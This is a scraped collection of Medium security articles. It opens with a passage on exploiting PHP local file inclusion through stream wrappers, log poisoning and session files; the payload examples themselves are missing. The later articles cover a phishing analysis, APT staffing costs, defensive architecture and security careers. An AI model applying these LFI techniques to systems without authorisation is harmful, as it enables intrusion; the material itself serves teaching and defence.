There is a handful of PHP wrappers who can access different I/O or data streams via the PHP daemon and can (if enabled; allow_url_include) lead to a direct execution of instructions. php://input is a read-only stream that allows reading raw data from the request body. In this case, it is possible to inject code via POST-request:
php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. It can be used to read the content of a PHP file (which gets interpreted when included the natural way):
In this case, the response is Base64 encoded (there are also other variants for returning the response e.g. ROT13 encoded: filter/read=string.rot13/resource=../vulnerable.php).
If the vulnerable application accepts file-uploads the zip:// or phar:// (PHP archive format) wrapper can be used for pointing to the uploaded and compressed version of the payload and unpacking it via a direct-path declaration:
The wrapper doesn’t need a .zip file-extension for unpacking and interpreting the data (a renamed ZIP-archive can also be used).
[5] Log poisoning
Web-servers like Apache or Nginx are logging user-requests or application-related errors (like a stack-trace) to specific log-files on the server. These files can be manipulated by e.g. requesting HTTP Status 404 (a not-found page) with the payload via some HTTP method. Beware! The inclusion of these files can crash the browser (log-files can be big).
It is also possible to use the SSH authentication (similar authentication schemes like FTP are working too) to deliver and execute a payload by connecting to the SSH service:
[6] PHP Sessions
PHP stores it’s user-session in files located under /var/lib/phpX/sess_<PHPSESSID> (where x=Version). If there is any function on the application like a login that pushes data into the current user-session file (e.g. a username for reflecting it later), this function can be abused to save the payload into the current session-file.
[7] phpinfo()
The output of the phpinfo() function contains the values of the PHP variables, including any values set via a POST, GET or FILE request. This can be used to debug the interpreter’s behavior by e.g. uploading a file which gets stored temporary in /tmp/<random> and is deleted at the end of the call. By making multiple upload posts to the function and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request, specifying the temporary filename. “LFISuite” created by D35m0nd142 allows to exploit this complex method:
[8] E-Mail
If the server is running a mail service it is possible to send the payload via mail and including it the associated log under /var/log/<user> (every other user has it’s own file).
I hope you learned some new things. If you found any content-related or grammatical errors or have an addition, write a comment.
Kind regards
SI9INT (twitter.com/@si9int | https://si9int.sh)
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Security', 'Bug Bounty', 'Hacking', 'Infosec', 'Cybersecurity']"
"Cyber Criminals are getting smarter, Organized and Sophisticated.",https://medium.com/swlh/cyber-criminals-are-getting-smarter-organized-and-sophisticated-6f348b7fa408?source=tag_archive---------0-----------------------,"Just this morning alone I have received two specially crafted scam emails from cyber criminals targeting unsuspecting Nigerians (mostly those that have bank accounts). I must say I am impressed!
I almost fell for this scam email even with my years of Information Security Research and Ethical Hacking. The reasons I almost fell for this scam are simply because.
When I clicked on the URL It took me to this fake website below.
Here is the original Website with Https Secured, padlock and a green color.
Nigerian cybercriminals are upping their game every day and getting sophisticated with new tools and technologies to aid their operations.
First this email contains an ow.ly link that redirects twice before reaching the final destination.
The first redirect was to this hacked website “http://www.freeskyaerospace.com/wp-content/themes/Hereisworld/fontawesome/less/spcsless.php”
Here is the first hacked website showing the directory. Here we can see the spcsless.php file that now redirects to another website.
This later redirected to a base64 encoded data URI which loads the web page on the victim’s system so no matter if all the websites involved are taken down the final website resides on the victim’s page.
Once you finally log in to the website it shows this page asking users to enter their security questions including their token.
Even after users fill in their details it takes them to this next page asking for their token. No matter how many times users enter their token it keeps showing an error message.
If the Bank token is actually Time-based One-time Password Algorithm (TOTP) then I believe the attacker would be getting this data over an instant protocol like XMPP or IRC. If this is the case then I believe this is an organized cyber crime.
I was able to quickly report the fake ow.ly link to HootSuite and they have quickly taken down the suspicious link.
Further digging up on the SPF records for udirect.com I was amazed that no single SPF record was in place. This means anyone can spoof the email address and send an email on behalf Udirect.com.
If a domain publishes an SPF record, spammers and phishers are less likely to forge e-mails pretending to be from that domain, because the forged e-mails are more likely to be caught in spam filters which check the SPF record. Therefore, an SPF-protected domain is less attractive to spammers and phishers. Because an SPF-protected domain is less attractive as a spoofed address, it is less likely to be blacklisted by spam filters and so ultimately the legitimate e-mail from the domain is more likely to get through.[4]
I was able to report the link and successfully shut down that particular campaign but there are hundreds of thousands of spam emails being sent every day and more people are falling into scams. There is little that individuals like me can do. I hope more organizations would really take information security very serious.
I currently work as the Digital Security Lead at CcHub and working on an Osiwa project to help CSO's, Journalist, Active Citizens and bloggers protect themselves from Digital Security threats.
If you find this article interesting, please hit ♥ so others can enjoy it too and you can tweet @olufuwatayo or mail me at olufuwa.tayo(gmail.com)
Written by
","['Top Story', '▫️Medium Things▫️', 'Email', 'Security', 'Cybersecurity']"
Cyber: Ignore the Penetration Testers - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/cyber-ignore-the-penetration-testers-900e76a49500?source=tag_archive---------0-----------------------,"There are a lot of people generating a lot of text about cyberwar, cyberconflict, cyberweapons, cyber everything. They are, for the most part, completely wrong. I firmly believe that a technical background, particularly a security background, is critical to understanding the fifth domain (you guessed it: cyber.) But technical chops are not enough, or even necessarily a prerequisite, to speaking with authority on the subject.
The fog of cyberwar is the war.
Penetration testers have this problem where they frequently can’t see past the end of their Kali USB. They establish the false equivalence of: “China hacked $X; I can hack $X; therefore, I am an APT and an APT is like me.” An APT is literally the instantiation of a nation state’s will. It is not a toolchain.
The important thing to remember about the fifth domain is that it is not actually about technology — it is about people. How people perform sensemaking and interpret reality is a matter of what their devices inform them.
People are the problem with cyber.
There are other important angles to cover as well: technical capabilities; analytic skills; agility; information; purpose; deterrence; attribution; geopolitics; espionage and counterespionage; intelligence, and counterintelligence. I will not be covering those. Instead, I want to explore why people with a purely technical❖ understanding of hacking are so frequently wrong about the nature of fifth domain conflict.
❖ Although generally not as horribly wrong as those with no technical background at all.
One reason that penetration testers are not very good at understanding the complexities of cyber conflict is that they see only the tooling. As a geek myself, I have a similar infatuation with clever tools and hacks, but tools are not that important. To quote Boyd:
People. Ideas. Hardware. In that order.
The same priority holds true in cyber. A powerful APT is not defined by its tools, but by the people and ideas they have, and then the toolchain that they develop to accomplish their goals (generally set for them by someone else.)
For our thought experiment, let’s assume that a customer wants to know a secret. Someone somewhere is guarding this secret, but it is on a computer so it is within our reach, given resources…
This will be a very lean, very focused APT, with limited flexibility. So, let’s dive right in — how to create an APT.
You can’t download your way to parity with Ft Meade — Mara
The part everyone is familiar with in cyber is the hacking, the exploits, the implants and toolchains. These need to be researched, developed, maintained, and put to use. Additionally, they need to run somewhere on something. So there has to be support staff, the sys admins and dev ops to keep the computers up.
Right now, this is almost the bare minimum, but we can double up some of the roles. An operator can be a developer, and the sys admin can be a developer (and/or an operator.)
Our basic team is, combined, a minimum of 2–5 people. They need to be well compensated because these are highly technical roles and the competition for security people is fierce. This is a lean APT, so no room for dead wood, so salary plus benefits and bonuses, is probably at $250,000 a year per person (there’s a discount because they get to actually hack, rather than juggle spreadsheets and go to meetings.)
Cost: 4 pax @ $250,000
Support is a less technical role — laundering money and registering shell accounts is not quite the same skill set as x86 assembly and Windows kernel heap layouts. However, it is critical that all those exploits and tools developed by the ops team have infrastructure to run on, and that it can’t be traced directly to the group. Again, lean APT: there only needs to be one person to create shell companies, launder money, and register accounts for everyone. The compensation is less attractive than for the technical people, but still, this is a job that requires skills, so let’s say $125,000.
Cost: 1 pax @ $125,000
The fat edge of the wedge. The ops team can develop a toolchain and get the APT into any target. They have great infrastructure and support from the frontline team, and they are now exfiltrating data. This is great, exactly the point of having this APT group in the first place. The ability to get data. Except, well, most targets have gigabytes and terabytes of data. Even legal discovery (the other type of exfiltration no one ever talks about) involves searching massive numbers of files and documents for relevant information.
This lean APT is going to need an analyst or ten. Again, keeping it lean, we’ll stick to just a few post grads and one senior analyst to direct them. Since they are post grads, they aren’t super cheap, but this isn’t exactly paying English PhDs minimum wage to work as baristas. The number of analysts will be the bottleneck in the ability of the APT to generate useful intelligence. The operators got in, and got data out, but until it has been processed and turned into intelligence product it is pretty much useless. Fortunately, the job market for post docs is weak, so they are cheaper hires.
Cost: 1 x sr analyst @ $120,000, 5 x analysts @ $75,000
UPDATE: As was pointed out on Twitter, this analysis team doesn’t include any translators. In reality, there would be a lot of translators. In this example, we will pretend that the team is fluent in the target language (although, of course, this further limits the APT’s flexibility.)
The analysts will have to sift through data, cull out the good bits, develop documents, reference and index previous findings, produce models, and generally need some ability to process and query the data. This means tools, computers, and support staff to keep that infrastructure running. This lean APT is adding headcount at an alarming rate, so let’s keep the support staff very minimal and buy as much off the shelf software as possible.
There are a lot of software offerings, but we’ll use IBM’s i2 analysts notebook.
Cost: 1 x sys admin @ $80,000, software costs: $20,000 (minimum)
UPDATE: A friend pointed out that actually, given the volume of data that will be exfiltrated and the need to process and search it, the analysis support team will probably need to build a “mini Google.” And i2 analysts notebook is completely the wrong tool for the job (however, it was the only one for which I could find a price.)
So the real cost here probably includes 2–3 engineers for setting up Hadoop clusters, search interfaces, and input/output processing filters. That is highly technical work, so probably $200,000 each. And of course, now the Analysis Support is large enough that it might require another manager, at least a project manager, to keep on track. This section of the team is probably going to run to over $500,000 by itself.
This lean and mean APT that can hack any single target (of a particular type) plus analyse and produce intelligence product is now over 10 people. This requires management overhead, because there has to be coordination and direction. If we make the manager handle the analysis and the operations (not a great idea, totally different skillsets) we can can get away with just one. However, there it would be far better to have two managers.
Cost: 2 x managers @ $125,000
The headcount has grown to about 15 people, all of whom will need to be put into a building somewhere with computers and internet and a coffee machine. They need electricity, climate control (heating or cooling), security personnel and equipment (CCTV, good locks, etc.) This supporting infrastructure for the employees and their computers has a cost, even if it is kept low. I won’t even try to estimate it, but you can imagine where this is going…
Even a lean mean targeted APT — they can break into any [specific] target, exfiltrate data, analyse it and produce intelligence product — operating for a single year, is over $2,000,000. That’s very cheap, of course. But it doesn’t include the infrastructure costs, the 24x7 guard personnel, any margin for purchasing tools rather than developing them in house, churn (the staff will move to other shops and need to be replaced), plus the coffee budget. There are 15 people working at this APT to produce intelligence, and only a couple of them are actually hacking or writing exploits.
This is where penetration testers get it wrong. They are the hackers and (sometimes) the exploit writers. They never have to exfiltrate data, or dwell on networks for months, or burrow so deep they can never be extracted, or analyse the data collected. The experience of a pen tester is very narrowly focused on just breaking into systems, which is their end goal. For the APT crew, the break in is just one step towards the goal.
If your plan is: first thing we do, we hack! You’re doing it wrong.
The above describes a general purpose, if small, team. Individual hacks may not need all the roles — sloppy security could facilitate greater use of off-the-shelf tools, insider sources could slash the analysis workload, and if you’re just after some cash, you might be able to do away with the analysis entirely; just wire some money to a convenient casino or three. But this is the right ballpark for a sustainable, consistent team producing useful, actionable intelligence against a range of targets.
This is my problem with the typical infosec crew doing analysis on cyber. They see only the hacking, and as such they see it as a near-trivial capability available to anyone suitably motivated with some technical expertise. Real cyber is much more involved. You’re not going to get it from hackforums, and it’s not within reach of every jihadi with a grievance.
Written by
","['Cybersecurity', 'Security', 'Cyber', 'Operational Security']"
Cyber-Physical Systems Defence Strategies & Tactics,https://medium.com/@jym/cyber-physical-systems-defence-strategies-tactics-925c34ab6c46?source=tag_archive---------7-----------------------,"Attacks on exposed services can skip Stage 3 from Stage 1 & straight into Stage 4 of an Attack-Life-Cycle. From the client side, abusing credentials & native tools/features within the Operating Systems & applications makes it difficult to answer the question above. We can further generalise the problems with the following model:
The Three Tenets model is used by the US Air Force Research Laboratory for secure system research and development. The model defines the necessary & sufficient conditions for possible successful attacks. The overall strategy is to disrupt one or more of the conditions through careful planning, design & tactics.
Adding more layers that depends on ‘bad’ signatures, regardless the sophistication of the ‘signature’ detection (eg. sandbox analysis), is not layered defence, it’s just wasting time in terms of handling false-positives & money. Different tactics should be used for the various stages of the Attack Life-Cycle to disrupt one or more of the attack conditions. The key objective is to deal with external actors effectively at Stage 1 & 2 such that we are left with Insiders for Stage 3 & 4. A high-level system view looks something like this:
Trapping the adversarial early at the external & internal reconnaissance stages gives us reliable early warnings of attacks. A simple example of deceptive trap for web-servers is to fake a vulnerable server version to trick attackers to use old exploits. The perimeter network IPS can then be tuned to block specific network exploits attempts with low/no false positives. For Windows client machines, a simple command can plant fake administrative accounts to lure the intruder to dump credentials & use ‘Pass-the-hash’, a common lateral movement technique.
For more comprehensive deception, Companies like TrapX & Canary are making honeypots deployment & management much easier within enterprise networks to mislead the adversaries & provide higher confidence detection when used together with SIEM, user behaviour analytics & visualisation.
Use deception for early & reliable detection.
Instead adding more layers of complexity at the perimeter, consider Isolation Platforms from Menlo Security & FireGlass which are agent-less solutions. In my opinion, the two products evolved from Spikes Security’s AirGap which required browser agent. Agent-less approach benefits both the client & server ends. End-users can surf safely with any modern browsers without the risks of malware infection & phishing. The platform also allows conversion of any potentially malicious contents into benign formats that can be used within the internal networks (Content Sanitisation).
At the server-side, legitimate external users can only use the exposed web services through the Isolation Platform without the need to install agents & provides a seamless user experience. For the attacker, Isolation Platforms deny the use of automated tools that abuse flaws within the web services. Attackers can still manually type malicious codes into the input fields via a browser thus the second layer of Secure Reverse Proxy or Web Application Firewall that allows only whitelisted outbound contents.
Protect both users & services with an Isolation Platform. The Outbound traffic control is an insurance against implementation mistakes in web-based services & clever evasive attack techniques.
Some assets may need to be connected directly to the Internet, Layered Endpoint Defence is necessary to mitigate the risks of malware & software-based external command & control.
Malware that abuses OS & Applications features/functionalities are cheap to write & plentiful samples & tutorials are available on the Internet. I left Blacklisting in the above illustration for the sake of completeness but we should be using Whitelisting. Depending on your OS & Applications, there are still features that can be abused even after applying application whitelisting. As such, we need to identify such gaps & remove them whenever possible.
Whitelisted applications & OS will always have bugs. These bugs are in turn exploited to perform code-injection & execution. To address the unending bug issues with endpoints, startups are using two main approaches to mitigate bug exploitations: containment through virtualization & disrupting exploit techniques (anti-exploitation or exploit mitigation).
Notable products that deal with bug exploitation through containment are Bromium, ReaQta & Bufferzone. The Anti-Exploitation products that focus on disrupting exploitation techniques are Microsoft EMET, Palo Alto Networks’ TRAPS & Morphisec. App whitelisting & configuration hardening should be applied to OSes whenever possible.
Repurpose Anti-Virus budgets for more effective exploit mitigation.
I will further explain how this proposed architecture will make anomalies stand-out especially at Stage 2 of an Attack Life-Cycle, so that SOC teams spend less time processing malware alerts & focus on other stages of attacks.
Any external C2 call-back will stick out like a sore-thumbWith this design, all client endpoints will only surf via the internal IP address of the Isolation Platform, the endpoints may also communicate with other internal servers. In an unlikely event of breaching the Isolation Platform, any attempts to call-back to external networks will stand-out. One viable way of controlling the endpoints is to use a side-channel which is guarded by Device & Network Access Control.
Least Privilege PrincipleAll administrative tasks should be performed via secured jump servers which are logged & monitored. This together with Application Whitelisting will allow effective profiling of both client & server zones. By using basic statistical techniques like Least Frequency of Occurence, we can better spot rare occurences of both network & host process indicators. The SIEM rules will then be concerned with abuse-cases like foreign process (identified by hash as with using Sysmon) or the use of the fake local admin account; the former being a Stage 2 — Run Payload & latter a Stage 3 — Privilege Escalate alert.
Use advance analytics to learn a clean network & deal with Insider Threats, let the other tactics to figure out the external C2
The absence of breaches does not imply sound security posture, it may be that organisations are simply clueless to breaches that had taken place. Organisations with matured security programmes often rely on penetration-testing but there are issues with pen-testing:
Companies like AttackIQ, SafeBreach & Picus recognised these problems & came up with products that help organisations better quantify their security posture through Continous Validation. These tools lower the learning curve to create test scenarios that use curated attack techniques to cover the entire kill-chain/Attack-Life-Cycle without the risk of system impacts & provide continuous test cycles with quick detailed reports for broader test coverage & objective quantification of security posture. For running tests with higher risks, one may consider Cyber-Range-as-a-Service from Simspace.
S.M.A.R.T goals are measurable.
Unless you have security teams like Google or Facebook, you will need sound strategies, tactics & be selective with the training & products.
Written by
","['Security', 'Cybersecurity']"
Cybersecurity Is About Much More Than Hacking - Featured Stories - Medium,https://medium.com/s/story/cybersecurity-isnt-just-about-hacks-f11c7ad07660?source=tag_archive---------3-----------------------,"There is something tantalizing about a lone hacker using a single computer and a big brain to take down the bad guys or stick it to the man. The archetype of the hacker has a cultivated ethos of freedom, individuality, and subtle craftiness that cannot be denied. From the ’90s cult classic Hackers to the more modern (and realistic) Mr. Robot, the hacker has long held a special place in pop culture. Despite this fascination with hacking, hackers, and cyberwarfare, the field is poorly understood outside of industry professionals.
As the software industry continues to “eat the world,” the software security industry has grown alongside it. As more software is deployed, it stands to reason that more software is vulnerable to attack. Indeed, there is growing concern among professionals that cybersecurity firms are seriously understaffed, and there aren’t nearly enough of them to combat the growing number of cyberattacks. Making matters worse, the continued drive toward accelerated training programs for software developers means that more developers are deploying code who have not had any formal security training.
Devices on the “Internet of Things” are notoriously insecure.
Lack of security fundamentals has always been a problem—many universities don’t require security training in their computer science degree programs—but the problem is further exacerbated by schools encouraging developers to do more with less training. In addition, software ecosystems increasingly encourage developers to rely heavily on third-party software, often without evaluating that software for vulnerabilities. The 2016 left-pad scandal gives us a glimpse into how increasing reliance on third-party software can open the internet to risk.
Left-pad is a simple program that “pads” text values on the left with some character (typically a 0 or a space) until it is a specified size. This function is mostly used to format textual output so it’s easier to read. The implementation is simple; at the time of the scandal, the function was 11 lines of straightforward JavaScript. Nevertheless, thousands and thousands of developers included this library in their code, and many of them unwittingly included it by including a different library that included left-pad.
The scandal began when the left-pad library was unpublished from a popular tool for managing JavaScript libraries called npm. When it was, all projects that relied on left-pad broke. All projects that relied on projects that relied on left-pad also broke. It was a huge headache for the JavaScript community, and it temporarily brought development to a halt for many hobbyists and companies.
Here is the security angle: What if instead of unpublishing the library, the maintainer of left-pad added a “feature” to log information about what was being left-padded to a server under their control, or worse, attempted to install some more holistic monitoring malware? Less maliciously, what if the library just had a small bug that could be exploited by a clever hacker?
Because so many people relied on the code unwittingly, such an exploit could easily go unnoticed by downstream developers. This web of interdependent software is one way the increasing complexity of software ecosystems amplifies the power of small vulnerabilities.
Last year, the Atlantic published “The Coming Software Apocalypse,” a harrowing look at the extraordinary complexity of modern software systems and how simple errors hidden in that complexity can cause catastrophic problems. One example? A six-hour-long 911 outage across the entire state of Washington:
The 911 outage, at the time the largest ever reported, was traced to software running on a server in Englewood, Colorado. Operated by a systems provider named Intrado, the server kept a running counter of how many calls it had routed to 911 dispatchers around the country. Intrado programmers had set a threshold for how high the counter could go. They picked a number in the millions.
Shortly before midnight on April 10, the counter exceeded that number, resulting in chaos. Because the counter was used to generate a unique identifier for each call, new calls were rejected. And because the programmers hadn’t anticipated the problem, they hadn’t created alarms to call attention to it.
While this 911 outage was not a result of a coordinated attack, it’s easy to imagine this vulnerability as part of an Ocean’s Eleven-style montage: Hackers roll the number past the limit right before their big heist, thus preventing reports of the robbery until after they’ve escaped. This is a garden-variety mistake that’s easy to forgive in the right context, but a rejected 911 call can have tragically dire consequences.
It is absolutely within the scope of a software security professional’s job to predict and protect against a failure of this type. Thinking about all the possible failure patterns for any piece of software is crucial for system hardening and risk mitigation. Unfortunately, little mistakes like setting an arbitrary threshold for database entries can have an outsized human impact—and little mistakes are all over the software world. (Remember Y2K?)
Consider another example where hackers were able to use a “smart fish tank thermometer” to steal a casino’s high roller database. In this case, the thermometer was less secure than other entry points to the casino’s network. In fact, devices on the “Internet of Things” are notoriously insecure. According to Wired magazine, these devices are frequently susceptible to attacks for a variety of reasons, including lack of commitment to security by device-makers, lack of transparency in the code running on devices, and lack of knowledge on the part of the people using and installing these devices.
Is the risk of a cyberattack worth the convenience of turning off your lights with your smartphone?
It’s understandable (honestly, expected) that employees installing a “smart thermometer” wouldn’t be software security experts. Even many software savvy individuals could be forgiven for not thinking about the thermometer as an attack vector. Unfortunately, every network-connected device opens us up to attacks. We need device-makers to start taking security seriously. Additionally, people would be wise to think carefully about how much value they get from a “smart” device versus a “dumb” one. Is the risk of a cyberattack worth the convenience of turning off your lights with your smartphone?
The growth and development of the software security field will continue to shape the trajectory of our future. Digital systems now play a crucial role in banking, payroll, distribution chains, voting, social interaction, medicine, cars, planes, trains, implanted medical devices, and so on. Each and every one of these digital systems is a potential vulnerability. As the scope of software broadens, so does the scope of software security. In 2018, the software security industry includes a wide variety of professionals with different skill sets, so what are they?
First is the most well-known archetype. Offensive security work is all about breaking into stuff and doing things you’re not supposed to be able to do. The particular goals of any given offensive hacker can be quite varied—from executing ransomware attacks such as WannaCry to stealing database records—but the crux of the craft is always about the question, “What can I do that the owner of this system doesn’t want me to do?”
Sometimes, this work involves deep knowledge of software design and implementation. Take a recent attack against cryptocurrency trading website MyEtherWallet.com. In this attack, the perpetrators exploited weaknesses in two critical networking protocols. First, hackers attacked the domain name system (DNS), which maps human understandable names like MyEtherWallet.com to computer understandable IP addresses used to route internet traffic. This attack, called DNS poisoning, allowed the hackers to send bogus IP addresses in response to queries for MyEtherWallet.com.
Second, the hackers attacked the border gateway protocol (BGP), which uses IP addresses and actually controls how traffic is routed through the physical infrastructure of the internet. This attack, called a BGP leak, caused internet traffic to travel through infected computers, which allowed the attackers to poison significantly more DNS queries.
As a result, several users who typed “MyEtherWallet.com” into their browsers URL bar were sent to a phishing website that looked like MyEtherWallet.com. When unsuspecting users typed in their usernames and passwords, that information was sent to the attackers who used it to empty those accounts.
Other offensive work can be more human-oriented. Take this hilarious (but terrifying) video of a social engineering expert taking over someone’s cellphone account with nothing more than a phone number spoofer, audio of a crying baby, and her charisma:
Breaking into systems requires creativity, flexibility, and a big picture mindset. Hackers—whether white-hat, black-hat, or something in between—benefit from thinking about multiple options for breaking into systems. Take the phone account example: Attackers might try brute force to get their mark’s password. They could have used a phishing scheme like the one used against MyEtherWallet. They could try a social engineering strategy like the one in the video. They might also try to actively break into the phone company’s network using malware.
When one strategy looks like it won’t work attackers try something else. The story of Stuxnet and Flame is illustrative. These two programs are some of the most impressive and complex pieces of malware ever created. The two worms are believed to have been created collaboratively by hackers working for the U.S. and Israeli governments starting around 2007. Stuxnet turned out to be a worm with a specific goal: infecting and shutting down Iranian nuclear centrifuges. Flame—a huge program by malware standards, at nearly 60 megabytes—was more of an espionage Swiss army knife. The malware enabled its controllers to steal data, monitor keystrokes, turn on cameras and microphones, and open up remote channels to install additional malware once the virus established itself on a host machine.
The features that originally led security experts to tie the two worms to the same creator were the mechanisms the viruses used to spread themselves. Flame famously utilized an exploit against Windows update servers that allowed the viruses to masquerade as legitimate software updates, obviously an effective way to spread the worm far and wide.
Stuxnet, on the other hand, was targeting a facility known to have an “air gap”—meaning no computers in the facility were connected to the internet. Stuxnet instead relied on an exploit that allowed infected USB devices to automatically infect any Windows machine they were plugged into. No one knows who the proverbial “patient zero” was, but for all we know NSA agents just scattered a few infected USB drives around the nuclear facility’s parking lot.
Flame used this exact same USB exploit, which is one of the findings that originally tied the two viruses together, but Stuxnet does not appear to have used the Windows update server exploit. The creators of Stuxnet knew they couldn’t break into the air-gapped systems this way, so they didn’t utilize that exploit to spread the virus. On the flip side, while Stuxnet always attempted to infect USBs that were plugged into an infected computer and spread itself further, Flame turned that feature off. Flame didn’t copy itself onto new USB devices the way Stuxnet did.
Because security is now a top priority for computer systems in general, the responsibility for making things secure by default has fallen on the people who know the system best.
The point is that even though the creators of Flame and Stuxnet had access to the same exploits for spreading the malware, they didn’t just throw them all at the wall to see what stuck. They thought carefully and made decisions about which exploits to use depending on their goals.
Government jobs where you create malware like Flame and Stuxnet are the NBA of hacking: A small handful of exceptional hackers do this kind of work. There are other people doing similar work with less expertise and in areas where the stakes are a little less extreme than cyberwarfare.
Penetration testers are hackers paid by companies to attempt to break into the company’s own systems. Companies pay hackers to report how they broke in so they can shore up their systems. Another kind of hacker, somewhere in between a penetration tester (white-hat) and a malicious hacker (black-hat) are private individuals who try to earn “bug bounties” provided by many companies. With a bug bounty program, a company agrees to pay anyone who can do something specific on their system (e.g., access a database) in exchange for the hacker explaining how they did it.
Much of the work done by penetration testers relies on using premade tools to execute an attack. They are tool users, not tool creators. Many of the tools still require some technical expertise to operate, but not nearly as much. Penetration testers may or may not be programmers or software engineers, but they are almost universally adept computer users who enjoy learning about new techniques and emerging toolsets.
Because the skills necessary depend a great deal on the specific goal, the scope of offensive work is broad and varied. From social engineering at the least technical levels to the development of malware, encryption breaking programs, and network intrusion tools at the most technical levels.
Mitigation and prevention are all about defense: building systems that make it difficult for hackers to do things they should not be able to do. The people doing this type of work tend to be quite technical. Software engineers, especially engineers working at the systems level, shoulder an outsized portion of this work.
That said, system admins, DevOps engineers, and network engineers will all be involved in some prevention/mitigation projects. Application developers must also do some of this work, especially to cover security holes introduced by the applications they build.
Increasingly, this kind of work has been moving from application engineers to systems engineers. Operating systems engineers define the interface that application developers use to access important things, such as files on the filesystem or the network card. Because security is now a top priority for computer systems in general, the responsibility for making things secure by default has fallen on the people who know the system best. The Windows operating system team knows best how Windows works and, therefore, how to prevent critical break-ins from occurring at the OS level. Said another way, a great operating system makes it hard for application engineers to introduce security vulnerabilities.
Big organizations have software teams dedicated to creating APIs that are inherently safe for application developers to use. By limiting the choices that an app developer can make to only “secure” ones, we can dramatically decrease the total attack surface. For example, Google announced in April that the Android OS now defaults to TLS for all connections, meaning internet connections are encrypted by default.
Using an unencrypted connection is obviously a privacy risk, and defaulting to TLS prevents Android users from being exposed to that risk holistically. In previous versions, it was up to application developers to ensure connections were properly encrypted. By preventing application developers from making the “wrong decision” by accident, Google has eliminated a variety of potential attack vectors.
Software organizations need to get serious about awareness, training, and execution for building secure software systems.
The proliferation of software and the increasing number of would-be attackers is bringing pressure to all kinds of developers. Obviously, it would be best if application developers couldn’t create security vulnerabilities because the OS engineers plugged every conceivable hole, but that’s not realistic. As a result, application developers and their management teams need to be more mindful of security practices throughout the software development lifecycle.
There are more ways than ever to break into programming, but most of them (including many university degree programs) are entirely unfocused on how to design secure software. Software organizations need to get serious about awareness, training, and execution for building secure software systems.
The inevitable vulnerabilities in software necessitate security practices downstream of software development as well. IT professionals, such as system administrators, also perform mitigation and prevention tasks — e.g. setting up secure VPNs to limit access to important internal servers or databases, selecting a cloud provider who has dedicated significant resources to security, and setting up monitoring and logging tools to inform stakeholders when devices on the network are behaving strangely or sending suspicious traffic.
Everyday computer users should engage in mitigation as well, hopefully by choosing strong passwords, minimizing password reuse, using two-factor authentication, and using privacy/security focused software, such as the EFF’s HTTPS Everywhere, the Brave web browser, or Keybase.
Just like “real life” security, prevention is usually a game of being less vulnerable than others. An unlocked car is more likely to be robbed than a locked car. Pickpockets look for the wallet peeking out of a back pocket. House robbers avoid barking dogs and alarm systems. Data thieves try common passwords before resorting to an exhaustive brute force attack. Hackers look for weak points in the network (like the fish tank thermometer). One thing hackers love—the equivalent of an unlocked door—is out-of-date software.
Hackers want to spend their time and efforts breaking something that will give them access to lots of machines; finding a flaw in a major operating system, web server platform, or encryption library would be a golden goose. When such a flaw is discovered, the security teams of the flawed system react and publish updates to plug the hole. Staying up-to-date is a critical aspect of the security-focused IT manager’s job.
Finally, because of the ever-evolving nature of security work, it’s common for offense and defense teams to cross-train by switching sides in red-team-versus-blue-team exercises. Learning how to attack a system helps you better defend against attacks—and vice versa.
Attacks are inevitable; forensics is all about investigating an attack after the fact. These firms are hired after, for example, the now infamous DNC email hack. It’s too late to get the emails back, but any sensible person would want to 1) stop someone else (or the same people) from breaking into the system again, 2) figure out what was stolen, and (if possible) 3) determine the identity of the hacker(s).
Ideally, the victim of a cyberattack knows it before the world does. In conjunction with mitigation and prevention efforts, security-focused engineers and IT professionals commonly add logging and reporting tools to critical software systems. This kind of reporting might involve receiving telemetry data from a crash report or logging inbound and outbound network traffic. These reporting efforts create clues that digital detectives ultimately use to figure out how someone broke into a system, what was compromised or stolen, and the potential scope of the problem.
Depending on the situation, forensics can involve looking at database access logs, network traffic logs, scouring the filesystem for clues about the break-in, such as malware and files that were created or altered by compromised users. This work is often multidisciplinary; hackers are creative and use lots of tactics to break into systems, so forensic experts need to be versed in a wide variety of tactics.
It’s never been more important to learn more about security best practices.
For most people in digital forensics, the goal is to identify the targeted data and/or systems, collect and recover information from those systems, and then analyze the collected data in order to determine how the attack took place. The result of a security audit may ultimately become a lawsuit or a criminal prosecution. Digital forensics experts benefit from an understanding of law and legal procedure to help them know what information is likely to be relevant to attorneys, judges, and juries. They also know how to acquire information in a way that doesn’t render it inadmissible in court, which is absolutely critical for digital forensics work within the FBI, for example.
In prevention, a lot of the work is done by software engineers making the systems secure. In forensics, it’s more about using tools and understanding the big picture than about writing code. Digital forensics experts will write short scripts and programs to help them find, collect, and preserve the clues, and there are definitely people writing these tools. But for the most part, forensic work does not involve the creation of software libraries or any large-scale software engineering efforts.
The last type of security expert also involves the most math. Cryptography researchers develop new codes, ciphers, and encryption techniques to ensure that data can be safely stored or transmitted in a way that protects it. Cryptography is a field that relies heavily on topics from computer science and mathematics.
These are the people inventing algorithms like the RSA public key encryption process or the SHA family of cryptographic hash functions. This is fundamentally different work from any of the other jobs mentioned. All the other types of work above involve securing and breaking actual systems that exist; they’re about actual phones, actual databases, and actual web servers. Cryptography is about securing data more abstractly.
Cryptographers rely heavily on mathematical principles to create algorithms that can process data in a few crucial ways. Specifically, the field of cryptography revolves around five pillars.
Transport Layer Security (TLS), which powers secure web communication, involves encryption algorithms that provide authentication, confidentiality, and integrity. Authentication to ensure that you’re connected to the right web server, confidentiality to ensure that only you and that web server can see your communication, and integrity to ensure that no one can alter those messages while they are in transit. TLS allows for the use of several different encryption algorithms for most of the connection, but requires the use of RSA for authentication and confidentiality during the “TLS Handshake.”
Developers of TLS implementations, such as OpenSSL, rely on math researchers to invent encryption algorithms with desired properties. Just like application developers rely on operating system engineers to provide a safe API into the operating system, OS engineers rely on cryptographers to invent safe encryption algorithms. Problems at this level can cascade throughout the technology that relies on the math; for example, Flame’s ability to spread by masquerading as a legitimate Windows update hinged on a fault in a cryptographic hashing algorithm called MD5.
Many cryptographers are working on encryption algorithms that will be impervious to quantum computers. Powerful quantum computers are expected to break RSA. If a high-powered quantum computer arrives on the scene, RSA will become entirely insecure, and huge swaths of internet traffic will have to make a switch to using a quantum-proof encryption algorithm instead of RSA.
Software security is a huge (and growing) market, and there’s never been a better time to dive in. If you’re already working in the software world, it’s never been more important to learn more about security best practices. Computers and the internet aren’t going to disappear anytime soon, so we might as well figure out how to secure the damn things!
Written by
